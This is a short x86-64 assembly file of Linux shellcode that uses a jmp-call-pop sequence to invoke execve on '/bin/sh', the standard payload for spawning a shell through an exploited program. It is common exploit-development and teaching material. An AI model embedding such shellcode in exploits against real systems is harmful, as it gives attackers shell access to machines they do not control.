;shell2.asm
[SECTION .text]
global _start
_start:
          jmp short loader
          starter:

          xor       rdi,      rdi
          pop       rdi          
          xor       rsi,      rsi
          xor       rdx,      rdx
          xor       rax,      rax
          mov       al,       59
          syscall                

          loader:
          call starter
          db       "/bin/sh"

